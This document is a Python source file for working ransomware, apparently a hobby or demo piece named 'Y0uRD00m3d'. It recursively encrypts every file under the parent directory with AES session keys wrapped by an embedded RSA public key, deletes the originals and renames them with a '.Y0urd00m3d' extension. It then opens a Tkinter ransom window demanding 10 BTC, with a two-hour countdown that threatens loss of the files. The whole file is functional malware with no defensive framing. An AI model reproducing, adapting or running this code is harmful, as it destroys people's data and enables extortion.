import base64
import os
import tkinter as tk

from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES


# public key with base64 encoding
pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFsUkk3R1JZbW1QVHB0UE5vMkdDdgpTL1lGRlM2RjBFcVRJZ1FKRTREVnBkeGhkQkNIYXA1LytNREFpTTNOMHZoa0t6dWVrVThxRUp4YjdJZjZFenplCkpxdWRKdTZGU2VVSXhnMzhWdC9rMDNSV3NaT0UxN25QeFlXMWc1aU9IMTM4ZDM3QnB6c25pVTVtQW9NUUl0L2wKeE1jb3lMeTU1cnBmVEYzK012SHRBMk9UUWJsRmVZdTNnem41MEpTUnY2UXhOOU52K1NMU2FYb0k3di9xNEtRZwpWYzZaR3JUaEFTU3lBN2VVdjJsVTJvZ2s0dTBrK2VUbkZrdUg0UXpZZ0VWSzdyTVRndkgzakVLSTlxb09aOXNaCmUwVjJjUWxhbHFyOUV6L3VwS0xpQmVmZlFQbE01S3dQYmtteU95UzJHOTRLZXhTUzlCTC81YllVTGYzK1M4ZGwKUlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
pubKey = base64.b64decode(pubKey)

# function for directory scan
def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


# function for encryption
def encrypt(dataFile, publicKey):
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    #convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the pub key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    fileName = dataFile.split(extension)[0]
    fileExtension = '.Y0urd00m3d'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    os.remove(dataFile)

# change the directory to the directory of the script keep secure of changing the directory
directory = '../'
excludeExtension = ['.py', '.pem', '.exe'] # exclude extensions that you want :)
for item in scanRecurse(directory):
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in excludeExtension:
        continue
    encrypt(filePath, pubKey)

def countdown(count):
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        if second > 0:
            second -=1
        elif minute > 0:
            minute -=1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))

root = tk.Tk()
root.title('Y0uRD00m3d Ransomware')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(root, text = 'Your data is encrypted, pay me 10 BTCs,\nto unlock them !!!\n\n', font=('calibri', 12, 'bold'))
label1.pack()
label = tk.Label(root, font=('calibri', 50, 'bold'), fg = 'white', bg = 'red')
label.pack()
label2 = tk.Label(root, text = '\n\n If the time runs out your file\nwill be gone !!!\n\n', font=('calibri', 12, 'bold'))
label2.pack()

countdown('02:00:00')
root.mainloop()